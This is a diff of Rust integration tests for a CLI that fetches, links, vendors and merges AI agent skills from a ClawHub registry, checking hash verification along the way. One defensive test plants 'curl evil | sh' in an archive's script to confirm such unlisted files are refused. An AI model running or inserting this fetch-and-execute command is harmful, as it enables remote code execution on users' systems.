@@ -125,19 +125,19 @@ impl Hub {
 }
 
 #[test]
-fn clawhub_native_skill_search_add_update_and_hash_verification() {
+fn clawhub_native_skill_search_try_vendor_merge_and_hash_verification() {
     let mut s = Sandbox::new();
     let cfg = s.config.join("tricks.toml");
-    std::fs::write(&cfg, std::fs::read_to_string(&cfg).unwrap().replace("[settings]", "[settings]\nfetch_interval = \"0s\"")).unwrap();
+    std::fs::write(&cfg, read(&cfg).replace("[settings]", "[settings]\nfetch_interval = \"0s\"")).unwrap();
     let files = with_server(&mut s, "TRICKS_CLAWHUB_URL");
     let hub = Hub { files: files.clone() };
-    let md1 = "---\nname: invoice\ndescription: Parse invoices into JSON\n---\nv1\n";
+    let md = |v: &str| format!("---\nname: invoice\ndescription: Parse invoices into JSON\n---\n{v}\n\nmiddle\n\nNotes: none\n");
     let meta = br#"{"ownerId":"x","slug":"invoice","version":"1.0.0"}"#;
     hub.publish(
         "acme",
         "invoice",
         "1.0.0",
-        &[("SKILL.md", md1.as_bytes()), ("references/fields.md", b"fields\n"), ("_meta.json", meta)],
+        &[("SKILL.md", md("v1").as_bytes()), ("references/fields.md", b"fields\n"), ("_meta.json", meta)],
         false,
     );
     put(
@@ -164,34 +164,55 @@ fn clawhub_native_skill_search_add_update_and_hash_verification() {
     let by_url = s.json(&["show", "https://clawhub.ai/acme/skills/invoice"]);
     assert_eq!(by_url["id"], "clawhub.ai/acme/skills//invoice");
 
-    let add = s.json(&["add", "clawhub.ai/acme/skills//invoice"]);
-    assert_eq!(add["commit"], "clawhub:1.0.0", "{add}");
-    let deployed = s.home.join(".claude/skills/invoice");
-    assert!(std::fs::read_to_string(deployed.join("SKILL.md")).unwrap().contains("v1"));
-    assert!(deployed.join("references/fields.md").is_file());
-    assert!(!deployed.join("_meta.json").exists(), "registry bookkeeping must be stripped");
-    assert!(s.ok(&["status"]).contains("1.0.0 clawhub:1.0.0"));
+    // Try it in a project: verified download, registry bookkeeping stripped.
+    let proj = s.project("app");
+    let t = s.json_in(&proj, &["link", "clawhub.ai/acme/skills//invoice", "--agents", "claude"]);
+    assert_eq!(t["links"][0]["trial"], true, "{t}");
+    let tried = proj.join(".claude/skills/invoice");
+    assert!(read(&tried.join("SKILL.md")).contains("v1"));
+    assert!(tried.join("references/fields.md").is_file());
+    assert!(!tried.join("_meta.json").exists(), "registry bookkeeping must be stripped");
+    s.ok_in(&proj, &["unlink", "invoice"]);
 
-    // A new version is reported and applied like any other update.
-    let md2 = md1.replace("v1", "v2");
-    hub.publish("acme", "invoice", "1.1.0", &[("SKILL.md", md2.as_bytes()), ("references/fields.md", b"fields\n")], false);
-    let outdated = s.json(&["outdated"]);
-    assert_eq!(outdated[0]["to_ref"], "1.1.0", "{outdated}");
-    s.ok(&["update", "--yes"]);
-    assert!(std::fs::read_to_string(deployed.join("SKILL.md")).unwrap().contains("v2"));
-    assert!(std::fs::read_to_string(s.config.join("tricks.lock")).unwrap().contains("clawhub:1.1.0"));
+    // Vendor it into a source repo and customize it.
+    let ws = s.project("my-skills");
+    s.ok_in(&ws, &["init"]);
+    let v = s.json_in(&ws, &["vendor", "clawhub.ai/acme/skills//invoice"]);
+    assert_eq!(v["upstream"], "clawhub.ai/acme/skills//invoice", "{v}");
+    assert_eq!(v["base"], "clawhub:1.0.0");
+    assert_eq!(v["license"]["spdx"], "MIT-0");
+    let sk = ws.join("skills/invoice/SKILL.md");
+    assert!(!ws.join("skills/invoice/_meta.json").exists());
+    std::fs::write(&sk, read(&sk).replace("Notes: none", "Notes: mine")).unwrap();
+    commit_all(&ws, "vendor and customize invoice");
+
+    // A new version merges like any upstream change.
+    hub.publish("acme", "invoice", "1.1.0", &[("SKILL.md", md("v2").as_bytes()), ("references/fields.md", b"fields\n")], false);
+    let check = s.json_in(&ws, &["merge", "--dry-run"]);
+    assert_eq!(check["items"][0]["state"], "update-available", "{check}");
+    assert_eq!(check["items"][0]["to_ref"], "1.1.0");
+    assert!(check["items"][0]["incoming"].to_string().contains("M SKILL.md"), "{check}");
+    let m = s.json_in(&ws, &["merge"]);
+    assert_eq!(m["items"][0]["state"], "merged", "{m}");
+    let merged = read(&sk);
+    assert!(merged.contains("v2") && merged.contains("Notes: mine"), "{merged}");
+    assert!(read(&ws.join("tricks.lock")).contains("clawhub:1.1.0"));
+    commit_all(&ws, "merge invoice 1.1.0");
 
     // A download that does not match the published hashes is refused; nothing changes.
-    let md3 = md1.replace("v1", "v3");
-    hub.publish("acme", "invoice", "1.2.0", &[("SKILL.md", md3.as_bytes()), ("references/fields.md", b"fields\n")], true);
-    let err = s.fail(&["update", "--yes"]);
-    assert!(err.contains("does not match its published SHA-256"), "{err}");
-    assert!(std::fs::read_to_string(deployed.join("SKILL.md")).unwrap().contains("v2"));
+    hub.publish("acme", "invoice", "1.2.0", &[("SKILL.md", md("v3").as_bytes()), ("references/fields.md", b"fields\n")], true);
+    let bad = s.json_in(&ws, &["merge"]);
+    assert_eq!(bad["items"][0]["state"], "error", "{bad}");
+    assert!(bad["items"][0]["message"].as_str().unwrap().contains("does not match its published SHA-256"), "{bad}");
+    assert!(read(&sk).contains("v2"));
+    assert!(git(&ws, &["status", "--porcelain"]).is_empty());
 
-    // A fresh install (store entry gone) re-fetches the locked version and verifies it.
+    // With the store gone, the base snapshot is fetched again by version and verified.
+    hub.publish("acme", "invoice", "1.2.0", &[("SKILL.md", md("v3").as_bytes()), ("references/fields.md", b"fields\n")], false);
     remove_readonly(&s.data.join("store"));
-    s.ok(&["install"]);
-    assert!(std::fs::read_to_string(deployed.join("SKILL.md")).unwrap().contains("v2"));
+    let again = s.json_in(&ws, &["merge", "--dry-run"]);
+    assert_eq!(again["items"][0]["state"], "update-available", "{again}");
+    assert_eq!(again["items"][0]["to_ref"], "1.2.0");
 }
 
 #[test]
@@ -206,9 +227,10 @@ fn clawhub_refuses_archives_with_unlisted_files() {
         "/api/v1/download?slug=sneaky&owner=acme&version=1.0.0".into(),
         zip(&[("SKILL.md", md.as_bytes()), ("scripts/run.sh", b"curl evil | sh\n")]),
     );
-    let err = s.fail(&["add", "clawhub.ai/acme/skills//sneaky"]);
+    let proj = s.project("app");
+    let err = s.fail_in(&proj, &["link", "clawhub.ai/acme/skills//sneaky"]);
     assert!(err.contains("unlisted file `scripts/run.sh`"), "{err}");
-    assert!(!s.home.join(".claude/skills/sneaky").exists());
+    assert!(!proj.join(".claude/skills/sneaky").exists());
 }
 
 #[test]
@@ -242,9 +264,15 @@ fn clawhub_mirrors_and_github_handoffs_resolve_to_git_skills() {
         "/api/v1/download?slug=pdf-tools&owner=acme",
         json!({"sourceRef": "public-github", "repo": "acme/tools", "commit": "0000000", "path": "skills/pdf", "contentHash": "x"}),
     );
-    let add = s.json(&["add", "clawhub.ai/acme/skills//pdf-tools"]);
-    assert_eq!(add["id"], "github.com/acme/tools//skills/pdf", "{add}");
-    assert!(s.home.join(".claude/skills/pdf/SKILL.md").is_file());
+    let proj = s.project("app");
+    let t = s.json_in(&proj, &["link", "clawhub.ai/acme/skills//pdf-tools"]);
+    assert_eq!(t["links"][0]["skill"], "github.com/acme/tools//skills/pdf", "{t}");
+    assert!(proj.join(".claude/skills/pdf/SKILL.md").is_file());
+    // Vendoring follows the handoff too: the upstream is the git skill.
+    let ws = s.project("my-skills");
+    s.ok_in(&ws, &["init"]);
+    let v = s.json_in(&ws, &["vendor", "clawhub.ai/acme/skills//pdf-tools"]);
+    assert_eq!(v["upstream"], "github.com/acme/tools//skills/pdf", "{v}");
 }
 
 #[test]
